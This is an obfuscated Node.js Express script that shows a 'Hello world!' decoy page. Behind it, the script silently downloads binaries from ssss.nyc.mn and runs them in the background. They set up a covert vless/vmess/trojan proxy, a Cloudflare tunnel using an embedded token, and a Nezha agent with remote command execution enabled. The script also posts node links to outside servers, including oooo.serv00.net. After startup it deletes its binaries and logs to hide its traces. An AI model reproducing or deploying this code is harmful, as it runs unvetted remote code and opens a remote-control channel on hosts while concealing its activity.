const _0x4046c9=_0x12f8;(function(_0x173cfc,_0x265d8c){const _0x11e94d=_0x12f8,_0x114b20=_0x173cfc();while(!![]){try{const _0x4540fc=-parseInt(_0x11e94d(0x1fe))/0x1+parseInt(_0x11e94d(0x1b7))/0x2*(parseInt(_0x11e94d(0x221))/0x3)+-parseInt(_0x11e94d(0x20a))/0x4+parseInt(_0x11e94d(0x214))/0x5+-parseInt(_0x11e94d(0x1c6))/0x6*(parseInt(_0x11e94d(0x1eb))/0x7)+parseInt(_0x11e94d(0x1b8))/0x8+parseInt(_0x11e94d(0x261))/0x9*(-parseInt(_0x11e94d(0x205))/0xa);if(_0x4540fc===_0x265d8c)break;else _0x114b20['push'](_0x114b20['shift']());}catch(_0x799600){_0x114b20['push'](_0x114b20['shift']());}}}(_0x24af,0x1efb3));const express=require(_0x4046c9(0x1bf)),app=express(),axios=require(_0x4046c9(0x22e)),os=require('os'),fs=require('fs'),path=require(_0x4046c9(0x1dd)),{promisify}=require('util'),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x4046c9(0x1ef)),UPLOAD_URL=process[_0x4046c9(0x266)][_0x4046c9(0x1f4)]||'',PROJECT_URL=process[_0x4046c9(0x266)][_0x4046c9(0x238)]||'',AUTO_ACCESS=process[_0x4046c9(0x266)][_0x4046c9(0x26b)]||![],FILE_PATH=process[_0x4046c9(0x266)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x4046c9(0x266)][_0x4046c9(0x22f)]||_0x4046c9(0x244),PORT=process['env'][_0x4046c9(0x216)]||process[_0x4046c9(0x266)][_0x4046c9(0x217)]||0xbb8,UUID=process[_0x4046c9(0x266)][_0x4046c9(0x1d2)]||_0x4046c9(0x1e4),NEZHA_SERVER=process[_0x4046c9(0x266)]['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x4046c9(0x24b)]||'',NEZHA_KEY=process[_0x4046c9(0x266)][_0x4046c9(0x200)]||'',ARGO_DOMAIN=process[_0x4046c9(0x266)][_0x4046c9(0x1de)]||_0x4046c9(0x20c),ARGO_AUTH=process[_0x4046c9(0x266)][_0x4046c9(0x227)]||_0x4046c9(0x1d8),ARGO_PORT=process[_0x4046c9(0x266)][_0x4046c9(0x1d6)]||0x1f41,CFIP=process['env'][_0x4046c9(0x1b9)]||_0x4046c9(0x1d1),CFPORT=process[_0x4046c9(0x266)][_0x4046c9(0x25f)]||0x1bb,NAME=process[_0x4046c9(0x266)]['NAME']||_0x4046c9(0x234);!fs[_0x4046c9(0x247)](FILE_PATH)?(fs[_0x4046c9(0x210)](FILE_PATH),console[_0x4046c9(0x1e8)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x4046c9(0x213));function generateRandomName(){const _0x47f64b=_0x4046c9,_0xdcc4f3=_0x47f64b(0x1fd);let _0x14ce4b='';for(let _0xdd1c4e=0x0;_0xdd1c4e<0x6;_0xdd1c4e++){_0x14ce4b+=_0xdcc4f3[_0x47f64b(0x260)](Math[_0x47f64b(0x23e)](Math[_0x47f64b(0x1e9)]()*_0xdcc4f3[_0x47f64b(0x1da)]));}return _0x14ce4b;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x12f8(_0xd44972,_0x4b557d){const _0x24afb3=_0x24af();return _0x12f8=function(_0x12f896,_0x26e6d9){_0x12f896=_0x12f896-0x1b7;let _0x1d9c4c=_0x24afb3[_0x12f896];return _0x1d9c4c;},_0x12f8(_0xd44972,_0x4b557d);}let npmPath=path[_0x4046c9(0x1e1)](FILE_PATH,npmName),phpPath=path[_0x4046c9(0x1e1)](FILE_PATH,phpName),webPath=path[_0x4046c9(0x1e1)](FILE_PATH,webName),botPath=path[_0x4046c9(0x1e1)](FILE_PATH,botName),subPath=path[_0x4046c9(0x1e1)](FILE_PATH,'sub.txt'),listPath=path[_0x4046c9(0x1e1)](FILE_PATH,_0x4046c9(0x206)),bootLogPath=path['join'](FILE_PATH,_0x4046c9(0x230)),configPath=path['join'](FILE_PATH,_0x4046c9(0x250));function deleteNodes(){const _0x532e79=_0x4046c9;try{if(!UPLOAD_URL)return;if(!fs[_0x532e79(0x247)](subPath))return;let _0xec44ec;try{_0xec44ec=fs[_0x532e79(0x23f)](subPath,_0x532e79(0x1bc));}catch{return null;}const _0x2dc6de=Buffer[_0x532e79(0x211)](_0xec44ec,_0x532e79(0x1f6))['toString'](_0x532e79(0x1bc)),_0x3f05e1=_0x2dc6de['split']('\x0a')['filter'](_0xa3e704=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x532e79(0x219)](_0xa3e704));if(_0x3f05e1[_0x532e79(0x1da)]===0x0)return;return axios[_0x532e79(0x246)](UPLOAD_URL+_0x532e79(0x1e2),JSON[_0x532e79(0x1e0)]({'nodes':_0x3f05e1}),{'headers':{'Content-Type':'application/json'}})[_0x532e79(0x1f2)](_0x49565e=>{return null;}),null;}catch(_0x40c186){return null;}}function cleanupOldFiles(){try{const _0x37b31e=fs['readdirSync'](FILE_PATH);_0x37b31e['forEach'](_0x17e7d4=>{const _0x569fb0=_0x12f8,_0x10cd0c=path[_0x569fb0(0x1e1)](FILE_PATH,_0x17e7d4);try{const _0x30fb70=fs[_0x569fb0(0x264)](_0x10cd0c);_0x30fb70[_0x569fb0(0x259)]()&&fs[_0x569fb0(0x236)](_0x10cd0c);}catch(_0x38a850){}});}catch(_0x41558e){}}function _0x24af(){const _0xc9c9e0=['sub','\x22\x20>\x20/dev/null\x202>&1','post','existsSync','/trojan-argo','blackhole','ARGO_DOMAIN:','NEZHA_PORT','\x20failed:\x20','aarch64','npm\x20running\x20error:\x20','match','config.json','get','stream','\x0aclient_secret:\x20','block','pipe','Add\x20automatic\x20access\x20task\x20faild:\x20','arm','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','isFile','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','&fp=firefox&type=ws&host=','?encryption=none&security=tls&sni=','Error\x20downloading\x20files:','--tls','CFPORT','charAt','9mMQmoy','clear','includes','statSync','firefox','env','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/dev/null','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/bot','AUTO_ACCESS','8443','arch','none','287732QnPGGr','662176RztYVZ','CFIP','freedom','vless','utf-8','127.0.0.1','/vmess-argo?ed=2560','express','automatic\x20access\x20task\x20added\x20successfully','push','basename','Subscription\x20uploaded\x20successfully','application/json','http','132906iLsGst','TunnelSecret','/api/add-subscriptions','2087','amd','https://amd64.ssss.nyc.mn/agent','2083','nohup\x20','rm\x20-rf\x20','/sub.txt\x20saved\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','cdns.doon.eu.org','UUID','App\x20is\x20running','2096','php\x20running\x20error:\x20','ARGO_PORT','/vless-argo','eyJhIjoiMWQ0NWRkMTM0YWE5MGJhM2RjYjdlODQ1N2IwZDlkYzMiLCJ0IjoiMTQ1OTNhM2UtMjM0MC00Y2JjLTkyYjQtYmM5YzI4NjNkNDk1IiwicyI6IlptUXpNR0UxTjJNdE0yVTRaUzAwTUdabUxXRmlaV1l0Wm1VMFlUTTFNalJtWWpRNSJ9','Download\x20','length','tls','\x0a\x20\x20\x0atrojan://','path','ARGO_DOMAIN','win32','stringify','join','/api/delete-nodes','writeFileSync','9e46dadd-1772-4e73-93ef-42fbae7767a4','chmod','Skipping\x20adding\x20automatic\x20access\x20task','tcp','log','random','direct','7DYubBl','vmess','forEach','close','child_process','https://arm64.ssss.nyc.mn/v1','https+local://8.8.8.8/dns-query','catch','quic','UPLOAD_URL','map','base64','\x0a\x20\x20credentials-file:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','config.yaml','tunnel.json','https://amd64.ssss.nyc.mn/web','Error\x20in\x20startserver:','abcdefghijklmnopqrstuvwxyz','66364oQGTvN','?security=tls&sni=','NEZHA_KEY','https://amd64.ssss.nyc.mn/bot','\x20successfully','status','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','70ouMfmS','list.txt','Nodes\x20uploaded\x20successfully','/api/add-nodes','unlink','1000536tuNhCl','&path=%2Fvless-argo%3Fed%3D2560#','xyz.ofzugkc.top','error','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','toString','mkdirSync','from','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20already\x20exists','1194585MsKuWS','https://arm64.ssss.nyc.mn/web','SERVER_PORT','PORT','\x20>/dev/null\x202>&1\x20&','test','listen','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','http\x20server\x20is\x20running\x20on\x20port:','2053','\x20-p\x20','443','true','3gQELHZ','\x0a\x20\x20\x20\x20','Error\x20executing\x20command:\x20','\x0avless://','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','pop','ARGO_AUTH','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Empowerment\x20success\x20for\x20','/vmess-argo','ArgoDomain:','\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','axios','SUB_PATH','boot.log','split','unshift','platform','jayden','.exe\x20>\x20nul\x202>&1','unlinkSync','send','PROJECT_URL','then','https://oooo.serv00.net/add-url','\x20-c\x20','response','fileUrl','floor','readFileSync','message','finish','web\x20running\x20error:\x20','tunnel.yml'];_0x24af=function(){return _0xc9c9e0;};return _0x24af();}app['get']('/',function(_0x277509,_0x7a65bf){const _0x4faadd=_0x4046c9;_0x7a65bf[_0x4faadd(0x237)]('Hello\x20world!');});async function generateConfig(){const _0x5dfa94=_0x4046c9,_0x4fdd5c={'log':{'access':_0x5dfa94(0x268),'error':_0x5dfa94(0x268),'loglevel':_0x5dfa94(0x26e)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5dfa94(0x1bb),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x5dfa94(0x1d7),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x5dfa94(0x248),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x5dfa94(0x1bd),'protocol':_0x5dfa94(0x1bb),'settings':{'clients':[{'id':UUID}],'decryption':_0x5dfa94(0x26e)},'streamSettings':{'network':_0x5dfa94(0x1e7),'security':_0x5dfa94(0x26e)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5dfa94(0x1bb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5dfa94(0x26e)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5dfa94(0x1d7)}},'sniffing':{'enabled':!![],'destOverride':[_0x5dfa94(0x1c5),_0x5dfa94(0x1db),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5dfa94(0x1bd),'protocol':_0x5dfa94(0x1ec),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5dfa94(0x22a)}},'sniffing':{'enabled':!![],'destOverride':[_0x5dfa94(0x1c5),_0x5dfa94(0x1db),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5dfa94(0x1bd),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5dfa94(0x26e),'wsSettings':{'path':_0x5dfa94(0x248)}},'sniffing':{'enabled':!![],'destOverride':[_0x5dfa94(0x1c5),_0x5dfa94(0x1db),_0x5dfa94(0x1f3)],'metadataOnly':![]}}],'dns':{'servers':[_0x5dfa94(0x1f1)]},'outbounds':[{'protocol':_0x5dfa94(0x1ba),'tag':_0x5dfa94(0x1ea)},{'protocol':_0x5dfa94(0x249),'tag':_0x5dfa94(0x254)}]};fs['writeFileSync'](path[_0x5dfa94(0x1e1)](FILE_PATH,_0x5dfa94(0x250)),JSON[_0x5dfa94(0x1e0)](_0x4fdd5c,null,0x2));}function getSystemArchitecture(){const _0x3afbea=_0x4046c9,_0x51f3dd=os[_0x3afbea(0x26d)]();return _0x51f3dd===_0x3afbea(0x257)||_0x51f3dd==='arm64'||_0x51f3dd===_0x3afbea(0x24d)?_0x3afbea(0x257):_0x3afbea(0x1ca);}function downloadFile(_0x4864c1,_0x2822e2,_0x5b7c23){const _0x174b7a=_0x4046c9,_0x58d5eb=_0x4864c1;!fs[_0x174b7a(0x247)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x20a77a=fs['createWriteStream'](_0x58d5eb);axios({'method':_0x174b7a(0x251),'url':_0x2822e2,'responseType':_0x174b7a(0x252)})[_0x174b7a(0x239)](_0x4be2fe=>{const _0x24890f=_0x174b7a;_0x4be2fe['data'][_0x24890f(0x255)](_0x20a77a),_0x20a77a['on'](_0x24890f(0x241),()=>{const _0x125d76=_0x24890f;_0x20a77a[_0x125d76(0x1ee)](),console[_0x125d76(0x1e8)]('Download\x20'+path['basename'](_0x58d5eb)+_0x125d76(0x202)),_0x5b7c23(null,_0x58d5eb);}),_0x20a77a['on'](_0x24890f(0x20d),_0x3442b6=>{const _0x55c65d=_0x24890f;fs[_0x55c65d(0x209)](_0x58d5eb,()=>{});const _0x2a21f4=_0x55c65d(0x1d9)+path[_0x55c65d(0x1c2)](_0x58d5eb)+_0x55c65d(0x24c)+_0x3442b6[_0x55c65d(0x240)];console[_0x55c65d(0x20d)](_0x2a21f4),_0x5b7c23(_0x2a21f4);});})[_0x174b7a(0x1f2)](_0x240815=>{const _0x28393b=_0x174b7a,_0x2b3209=_0x28393b(0x1d9)+path['basename'](_0x58d5eb)+_0x28393b(0x24c)+_0x240815['message'];console['error'](_0x2b3209),_0x5b7c23(_0x2b3209);});}async function downloadFilesAndRun(){const _0x47bc2e=_0x4046c9,_0x4ed6b8=getSystemArchitecture(),_0x100df5=getFilesForArchitecture(_0x4ed6b8);if(_0x100df5[_0x47bc2e(0x1da)]===0x0){console[_0x47bc2e(0x1e8)](_0x47bc2e(0x258));return;}const _0x515a0b=_0x100df5[_0x47bc2e(0x1f5)](_0x1747aa=>{return new Promise((_0xcfb2c9,_0x322b30)=>{const _0x281673=_0x12f8;downloadFile(_0x1747aa['fileName'],_0x1747aa[_0x281673(0x23d)],(_0x201e90,_0x56bc34)=>{_0x201e90?_0x322b30(_0x201e90):_0xcfb2c9(_0x56bc34);});});});try{await Promise['all'](_0x515a0b);}catch(_0xd11f29){console[_0x47bc2e(0x20d)](_0x47bc2e(0x25d),_0xd11f29);return;}function _0x3ffd2e(_0x524b5b){const _0x100ce4=_0x47bc2e,_0x1712f5=0x1fd;_0x524b5b[_0x100ce4(0x1ed)](_0x5a0c81=>{const _0x422cca=_0x100ce4;fs['existsSync'](_0x5a0c81)&&fs[_0x422cca(0x1e5)](_0x5a0c81,_0x1712f5,_0x3eb71b=>{const _0x3d422c=_0x422cca;_0x3eb71b?console[_0x3d422c(0x20d)]('Empowerment\x20failed\x20for\x20'+_0x5a0c81+':\x20'+_0x3eb71b):console[_0x3d422c(0x1e8)](_0x3d422c(0x229)+_0x5a0c81+':\x20'+_0x1712f5[_0x3d422c(0x20f)](0x8));});});}const _0x1f4725=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3ffd2e(_0x1f4725);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x72f0c9=NEZHA_SERVER[_0x47bc2e(0x263)](':')?NEZHA_SERVER[_0x47bc2e(0x231)](':')[_0x47bc2e(0x226)]():'',_0x2f1f42=new Set([_0x47bc2e(0x21f),_0x47bc2e(0x26c),_0x47bc2e(0x1d4),'2087','2083',_0x47bc2e(0x21d)]),_0x3dcc8c=_0x2f1f42['has'](_0x72f0c9)?_0x47bc2e(0x220):'false',_0x2dfcb7=_0x47bc2e(0x253)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x47bc2e(0x25a)+_0x3dcc8c+_0x47bc2e(0x267)+UUID;fs[_0x47bc2e(0x1e3)](path[_0x47bc2e(0x1e1)](FILE_PATH,_0x47bc2e(0x1f9)),_0x2dfcb7);const _0x895dce=_0x47bc2e(0x1cd)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x895dce),console['log'](phpName+_0x47bc2e(0x22c)),await new Promise(_0xfb66b7=>setTimeout(_0xfb66b7,0x3e8));}catch(_0x4c4398){console[_0x47bc2e(0x20d)](_0x47bc2e(0x1d5)+_0x4c4398);}}else{let _0x6c7cd3='';const _0x14e144=[_0x47bc2e(0x21f),'8443','2096',_0x47bc2e(0x1c9),_0x47bc2e(0x1cc),'2053'];_0x14e144['includes'](NEZHA_PORT)&&(_0x6c7cd3=_0x47bc2e(0x25e));const _0x1805a6='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x47bc2e(0x21e)+NEZHA_KEY+'\x20'+_0x6c7cd3+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1805a6),console[_0x47bc2e(0x1e8)](npmName+_0x47bc2e(0x22c)),await new Promise(_0x396d8e=>setTimeout(_0x396d8e,0x3e8));}catch(_0x1bc4f7){console[_0x47bc2e(0x20d)](_0x47bc2e(0x24e)+_0x1bc4f7);}}}else console[_0x47bc2e(0x1e8)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0xf3ef99=_0x47bc2e(0x1cd)+webPath+_0x47bc2e(0x23b)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0xf3ef99),console[_0x47bc2e(0x1e8)](webName+_0x47bc2e(0x22c)),await new Promise(_0x35a10a=>setTimeout(_0x35a10a,0x3e8));}catch(_0x292018){console['error'](_0x47bc2e(0x242)+_0x292018);}if(fs[_0x47bc2e(0x247)](botPath)){let _0xc0d54e;if(ARGO_AUTH[_0x47bc2e(0x24f)](/^[A-Z0-9a-z=]{120,250}$/))_0xc0d54e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x47bc2e(0x24f)](/TunnelSecret/)?_0xc0d54e=_0x47bc2e(0x22d)+FILE_PATH+'/tunnel.yml\x20run':_0xc0d54e=_0x47bc2e(0x1d0)+FILE_PATH+_0x47bc2e(0x225)+ARGO_PORT;try{await exec(_0x47bc2e(0x1cd)+botPath+'\x20'+_0xc0d54e+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x47bc2e(0x22c)),await new Promise(_0x4e1462=>setTimeout(_0x4e1462,0x7d0));}catch(_0x27889f){console[_0x47bc2e(0x20d)](_0x47bc2e(0x223)+_0x27889f);}}await new Promise(_0x399b11=>setTimeout(_0x399b11,0x1388));}function getFilesForArchitecture(_0x4b59c8){const _0x352609=_0x4046c9;let _0x5a102d;_0x4b59c8===_0x352609(0x257)?_0x5a102d=[{'fileName':webPath,'fileUrl':_0x352609(0x215)},{'fileName':botPath,'fileUrl':_0x352609(0x26a)}]:_0x5a102d=[{'fileName':webPath,'fileUrl':_0x352609(0x1fb)},{'fileName':botPath,'fileUrl':_0x352609(0x201)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x55c54b=_0x4b59c8===_0x352609(0x257)?'https://arm64.ssss.nyc.mn/agent':_0x352609(0x1cb);_0x5a102d[_0x352609(0x232)]({'fileName':npmPath,'fileUrl':_0x55c54b});}else{const _0x21b000=_0x4b59c8===_0x352609(0x257)?_0x352609(0x1f0):'https://amd64.ssss.nyc.mn/v1';_0x5a102d['unshift']({'fileName':phpPath,'fileUrl':_0x21b000});}}return _0x5a102d;}function argoType(){const _0x243238=_0x4046c9;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x243238(0x1e8)](_0x243238(0x212));return;}if(ARGO_AUTH[_0x243238(0x263)](_0x243238(0x1c7))){fs[_0x243238(0x1e3)](path[_0x243238(0x1e1)](FILE_PATH,_0x243238(0x1fa)),ARGO_AUTH);const _0x2a5ba4='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x243238(0x231)]('\x22')[0xb]+_0x243238(0x1f7)+path[_0x243238(0x1e1)](FILE_PATH,_0x243238(0x1fa))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x243238(0x20e)+ARGO_PORT+_0x243238(0x1f8);fs[_0x243238(0x1e3)](path[_0x243238(0x1e1)](FILE_PATH,_0x243238(0x243)),_0x2a5ba4);}else console[_0x243238(0x1e8)](_0x243238(0x228));}argoType();async function extractDomains(){const _0x327537=_0x4046c9;let _0x3a2251;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3a2251=ARGO_DOMAIN,console[_0x327537(0x1e8)](_0x327537(0x24a),_0x3a2251),await _0x1abaa4(_0x3a2251);else try{const _0x11202b=fs[_0x327537(0x23f)](path[_0x327537(0x1e1)](FILE_PATH,_0x327537(0x230)),_0x327537(0x1bc)),_0x55e343=_0x11202b[_0x327537(0x231)]('\x0a'),_0x127f48=[];_0x55e343['forEach'](_0x156c53=>{const _0x4b6ec5=_0x327537,_0x5944fd=_0x156c53[_0x4b6ec5(0x24f)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5944fd){const _0x14c63d=_0x5944fd[0x1];_0x127f48[_0x4b6ec5(0x1c1)](_0x14c63d);}});if(_0x127f48[_0x327537(0x1da)]>0x0)_0x3a2251=_0x127f48[0x0],console[_0x327537(0x1e8)](_0x327537(0x22b),_0x3a2251),await _0x1abaa4(_0x3a2251);else{console[_0x327537(0x1e8)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x327537(0x236)](path[_0x327537(0x1e1)](FILE_PATH,_0x327537(0x230)));async function _0x2c51a9(){const _0xf6ca70=_0x327537;try{process[_0xf6ca70(0x233)]===_0xf6ca70(0x1df)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0xf6ca70(0x235)):await exec('pkill\x20-f\x20\x22['+botName[_0xf6ca70(0x260)](0x0)+']'+botName['substring'](0x1)+_0xf6ca70(0x245));}catch(_0x3a4a66){}}_0x2c51a9(),await new Promise(_0xb04960=>setTimeout(_0xb04960,0xbb8));const _0x45adaa=_0x327537(0x1d0)+FILE_PATH+_0x327537(0x225)+ARGO_PORT;try{await exec(_0x327537(0x1cd)+botPath+'\x20'+_0x45adaa+_0x327537(0x218)),console[_0x327537(0x1e8)](botName+_0x327537(0x22c)),await new Promise(_0x4616a2=>setTimeout(_0x4616a2,0xbb8)),await extractDomains();}catch(_0x46e29a){console['error'](_0x327537(0x223)+_0x46e29a);}}}catch(_0x5a07ae){console['error']('Error\x20reading\x20boot.log:',_0x5a07ae);}async function _0x1abaa4(_0x2ec543){const _0x22911a=_0x327537,_0x580071=execSync(_0x22911a(0x204),{'encoding':_0x22911a(0x1bc)}),_0xfdfb80=_0x580071['trim'](),_0x25aa0e=NAME?NAME+'-'+_0xfdfb80:_0xfdfb80;return new Promise(_0x291a78=>{setTimeout(()=>{const _0x4af69f=_0x12f8,_0x352ddb={'v':'2','ps':''+_0x25aa0e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4af69f(0x26e),'net':'ws','type':_0x4af69f(0x26e),'host':_0x2ec543,'path':_0x4af69f(0x1be),'tls':_0x4af69f(0x1db),'sni':_0x2ec543,'alpn':'','fp':_0x4af69f(0x265)},_0x324ad0=_0x4af69f(0x224)+UUID+'@'+CFIP+':'+CFPORT+_0x4af69f(0x25c)+_0x2ec543+_0x4af69f(0x25b)+_0x2ec543+_0x4af69f(0x20b)+_0x25aa0e+'\x0a\x20\x20\x0avmess://'+Buffer[_0x4af69f(0x211)](JSON[_0x4af69f(0x1e0)](_0x352ddb))[_0x4af69f(0x20f)]('base64')+_0x4af69f(0x1dc)+UUID+'@'+CFIP+':'+CFPORT+_0x4af69f(0x1ff)+_0x2ec543+'&fp=firefox&type=ws&host='+_0x2ec543+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x25aa0e+_0x4af69f(0x222);console[_0x4af69f(0x1e8)](Buffer['from'](_0x324ad0)[_0x4af69f(0x20f)](_0x4af69f(0x1f6))),fs[_0x4af69f(0x1e3)](subPath,Buffer['from'](_0x324ad0)['toString']('base64')),console[_0x4af69f(0x1e8)](FILE_PATH+_0x4af69f(0x1cf)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x1914a0,_0x40eba0)=>{const _0x2f9c9e=_0x4af69f,_0x402248=Buffer[_0x2f9c9e(0x211)](_0x324ad0)[_0x2f9c9e(0x20f)](_0x2f9c9e(0x1f6));_0x40eba0['set']('Content-Type','text/plain;\x20charset=utf-8'),_0x40eba0[_0x2f9c9e(0x237)](_0x402248);}),_0x291a78(_0x324ad0);},0x7d0);});}}async function uploadNodes(){const _0x14c7d1=_0x4046c9;if(UPLOAD_URL&&PROJECT_URL){const _0x4ad3c2=PROJECT_URL+'/'+SUB_PATH,_0x315664={'subscription':[_0x4ad3c2]};try{const _0x5a58f4=await axios[_0x14c7d1(0x246)](UPLOAD_URL+_0x14c7d1(0x1c8),_0x315664,{'headers':{'Content-Type':_0x14c7d1(0x1c4)}});return _0x5a58f4&&_0x5a58f4[_0x14c7d1(0x203)]===0xc8?(console[_0x14c7d1(0x1e8)](_0x14c7d1(0x1c3)),_0x5a58f4):null;}catch(_0x3f1b6c){if(_0x3f1b6c[_0x14c7d1(0x23c)]){if(_0x3f1b6c['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x14c7d1(0x247)](listPath))return;const _0x53dd5c=fs[_0x14c7d1(0x23f)](listPath,_0x14c7d1(0x1bc)),_0x8df2d6=_0x53dd5c[_0x14c7d1(0x231)]('\x0a')['filter'](_0x2f80d2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x14c7d1(0x219)](_0x2f80d2));if(_0x8df2d6[_0x14c7d1(0x1da)]===0x0)return;const _0x22b114=JSON['stringify']({'nodes':_0x8df2d6});try{const _0x3871e4=await axios[_0x14c7d1(0x246)](UPLOAD_URL+_0x14c7d1(0x208),_0x22b114,{'headers':{'Content-Type':'application/json'}});return _0x3871e4&&_0x3871e4['status']===0xc8?(console['log'](_0x14c7d1(0x207)),_0x3871e4):null;}catch(_0x1331e4){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4db035=_0x12f8,_0x23d8e7=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x23d8e7[_0x4db035(0x1c1)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x23d8e7[_0x4db035(0x1c1)](phpPath);process[_0x4db035(0x233)]===_0x4db035(0x1df)?exec('del\x20/f\x20/q\x20'+_0x23d8e7[_0x4db035(0x1e1)]('\x20')+'\x20>\x20nul\x202>&1',_0x3052a8=>{const _0x21df2d=_0x4db035;console[_0x21df2d(0x262)](),console[_0x21df2d(0x1e8)](_0x21df2d(0x1d3)),console[_0x21df2d(0x1e8)](_0x21df2d(0x21b));}):exec(_0x4db035(0x1ce)+_0x23d8e7['join']('\x20')+_0x4db035(0x269),_0x2444b6=>{const _0x2ae7c6=_0x4db035;console[_0x2ae7c6(0x262)](),console[_0x2ae7c6(0x1e8)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5bfdb0=_0x4046c9;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5bfdb0(0x1e8)](_0x5bfdb0(0x1e6));return;}try{const _0x449be8=await axios['post'](_0x5bfdb0(0x23a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5bfdb0(0x1c4)}});return console[_0x5bfdb0(0x1e8)](_0x5bfdb0(0x1c0)),_0x449be8;}catch(_0x3d8b39){return console[_0x5bfdb0(0x20d)](_0x5bfdb0(0x256)+_0x3d8b39[_0x5bfdb0(0x240)]),null;}}async function startserver(){const _0x177a33=_0x4046c9;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x53da5e){console[_0x177a33(0x20d)](_0x177a33(0x1fc),_0x53da5e);}}startserver()[_0x4046c9(0x1f2)](_0x52b59e=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x52b59e);}),app[_0x4046c9(0x21a)](PORT,()=>console[_0x4046c9(0x1e8)](_0x4046c9(0x21c)+PORT+'!'));
